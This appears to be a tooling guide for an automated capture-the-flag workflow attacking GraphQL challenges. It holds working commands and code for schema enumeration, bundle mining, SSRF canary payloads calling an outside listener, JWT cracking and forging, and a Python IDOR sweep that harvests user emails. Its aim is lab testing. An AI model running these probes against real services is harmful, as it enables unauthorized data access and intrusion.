# Tooling — the repository's GraphQL primitives and how to wire them

The sanctioned tools for this class — `graphql_probe`, `http_probe`,
`oob_listener`, `bundle_miner`, `session_dissect`, plus the ledger hooks.
Every command below was verified against `--help`.

---

## 1. `tools/web/graphql_probe.py` — the GraphQL primitive

Three subcommands:

```bash
# bounded introspection — sends the __schema query, summarizes
python3 tools/web/graphql_probe.py introspect \
  --url "https://target/graphql" \
  --headers "Authorization: Bearer $TOK" \
  --timeout 15

# suggestion oracle — one typo'd name, harvest the hints
python3 tools/web/graphql_probe.py suggest \
  --url "https://target/graphql" --field userss

# mapped enumeration — seed + loop the oracle
python3 tools/web/graphql_probe.py map \
  --url "https://target/graphql" \
  --seed user,users,me,admin,flag,secret,token,debug,internal,config,env,log,audit \
  --max 100

# offline selftest — proves the probe logic without a target
python3 tools/web/graphql_probe.py --selftest
```

Flags (verified):

- `--url` — required, the endpoint.
- `--headers` — repeatable, `"Name: value"` pairs.
- `--timeout` — seconds per request.
- `--field` — (suggest) the typo'd name to probe.
- `--seed` — (map) comma-separated starting names.
- `--max` — (map) request ceiling; default bounded.

What each emits:

- `introspect` → the bounded `__schema` summary — types, root fields,
  mutations, subscriptions. Read this before grepping raw JSON.
- `suggest` → every `did you mean` hint parsed from the response — the
  confirmed field names.
- `map` → the harvested field list — seeds in, grown list out.

## 2. `tools/web/http_probe.py` — arbitrary GraphQL requests

When `graphql_probe` doesn't cover the shape — a mutation, a batched doc,
a weird body:

```bash
python3 tools/web/http_probe.py --challenge $CHAL \
  --url "$BASE/graphql" \
  --body '{"query":"{user(id:5){email}}"}' \
  --header "Content-Type: application/json" \
  --header "Authorization: Bearer $TOK"
```

`http_probe` holds request and response together — it emits the *complete*
`post-probe` command with `--response` already filled. Use it rather than
hand-assembling.

## 3. `tools/web/oob_listener.py` — the callback plane

For SSRF and stored-payload triggers:

```bash
# start the listener
python3 tools/web/oob_listener.py serve --port 8080

# check hits
python3 tools/web/oob_listener.py hits

# one-off canary probe — emits the URL + proves the hit
python3 tools/web/oob_listener.py canary
```

The canary URL rides `{fetch(url:"http://<listener>/x")}` or
`<img src=http://<listener>/x.png>` in a mutation — a hit proves the
server made an outbound request.

## 4. `tools/web/bundle_miner.py` — front-end archaeology

Mine the JS bundle for embedded query documents:

```bash
python3 tools/web/bundle_miner.py --url "https://target/" --out /tmp/bundle

grep -rhoE '(query|mutation|subscription) +[A-Za-z_][A-Za-z0-9_]* *(\([^)]*\))? *\{[^}]{0,4000}' \
  /tmp/bundle | sort -u

grep -rhoE 'gql`[^`]{10,4000}`' /tmp/bundle | sort -u
grep -rhoE 'graphql`[^`]{10,4000}`' /tmp/bundle | sort -u
grep -rhoE '"[a-zA-Z_]+":\s*"[a-f0-9]{64}"' /tmp/bundle   # persisted-query hashes
grep -rhoE 'persistedQuery|sha256Hash|PersistedQuery' /tmp/bundle
```

The recovered documents are *valid* queries — replay them with hostile
variables.

## 5. `tools/web/session_dissect.py` — when GraphQL hands back a token

```bash
python3 tools/web/session_dissect.py --token "<the-jwt>" \
  --wordlist /home/kali/wordlists/SecLists/Passwords/Common-Credentials/best110.txt
```

A `login` mutation returning a JWT → dissect it: alg, claims, weakness
(`none`, weak secret, `kid` injection) — then forge per
`skills/web-auth-session/`.

## 6. The ledger hooks — the control plane

Every probe is a `pre-probe`/`post-probe` pair; every flag is `pre-flag`:

```bash
# before the probe — declare what you're testing
python3 tools/hooks.py pre-probe $CHAL \
  --request 'POST /graphql {user(id:5){email}}' \
  --class web-graphql --hypothesis-id h1

# after — record the verdict with verbatim evidence
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {user(id:5){email}}' \
  --verdict confirms --evidence-kind impact --class web-graphql \
  --hypothesis-id h1 --evidence '"email":"victim@x.tld"' \
  --response '<verbatim response>'

# a falsifier observed
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {users{email}}' \
  --verdict refutes --evidence-kind class --class web-graphql \
  --hypothesis-id h2 --evidence '"message":"Forbidden"' \
  --response '<verbatim>'

# the flag
python3 tools/hooks.py pre-flag $CHAL \
  --value 'flag{abc123}' --source response \
  --evidence '"value":"flag{abc123}"'
```

The `--evidence` must be a substring of `--response` — the gate checks.

## 7. `tools/state.py` — the hypothesis ledger

```bash
python3 tools/state.py $CHAL --bug-class web-graphql
python3 tools/state.py $CHAL --hypothesis "nested-resolver escape via post.author"
python3 tools/state.py $CHAL --hypothesis "batching accepted — sweep-capable"
python3 tools/state.py $CHAL --strategy-used chain_match
python3 tools/state.py $CHAL --show
python3 tools/decide.py $CHAL
```

## 8. The Python client skeleton — custom scripts

When the primitives don't fit — a script is fine:

```python
#!/usr/bin/env python3
import requests, json, sys, time
URL = "https://target/graphql"
H = {"Authorization": f"Bearer {sys.argv[1]}"} if len(sys.argv)>1 else {}

def q(doc, vars=None, op=None):
    body = {"query": doc}
    if vars is not None: body["variables"] = vars
    if op: body["operationName"] = op
    r = requests.post(URL, json=body, headers=H, timeout=10)
    try:
        j = r.json()
    except:
        return r.status_code, r.text[:200]
    return r.status_code, j

# example: IDOR sweep
for i in range(1, 50):
    code, j = q(f'{{user(id:{i}){{id email}}}}')
    if j.get('data',{}).get('user'):
        print(i, j['data']['user'])
    time.sleep(0.05)
```

Requests is installed; no new deps needed.

## 9. What NOT to hand-roll

| Instead of | Use |
|---|---|
| `curl` + hand-pasted response | `http_probe.py` — emits `--response` |
| Grepping a response by hand | `post-probe --evidence <verbatim>` — substring-checked |
| Guessing field names | `graphql_probe map` — suggestion oracle |
| Hand-writing a `pre-flag` | `hooks.py pre-flag --value ... --evidence ...` — the gate |
| Claiming a `confirms` without `--evidence` | the gate rejects — always quote |
| Treating `Cannot query field` as authz | read `error-analysis.md` — it's a *missing-field* error |

## 10. The audit trail shape for a GraphQL session

```bash
# 0. recon
python3 tools/web/bundle_miner.py --url "https://$HOST/" --out /tmp/bundle

# 1. confirm + fingerprint
python3 tools/web/graphql_probe.py introspect --url "$BASE/graphql" \
  --headers "Authorization: Bearer $TOK" > /tmp/schema.json

# 2. surface map
jq -r '.data.__schema.types[].name' /tmp/schema.json | sort > /tmp/types.txt

# 3. ledger start
python3 tools/state.py $CHAL --bug-class web-graphql

# 4. per-P0-field probes — each a pre/post pair
python3 tools/hooks.py pre-probe $CHAL \
  --request 'POST /graphql {user(id:5){email}}' --class web-graphql --hypothesis-id h1
python3 tools/web/http_probe.py --challenge $CHAL --url "$BASE/graphql" \
  --body '{"query":"{user(id:5){email}}"}' --header 'Content-Type: application/json'
# http_probe emits the post-probe command — run it

# 5. flag
python3 tools/hooks.py pre-flag $CHAL --value 'flag{...}' --source response --evidence '...'
```
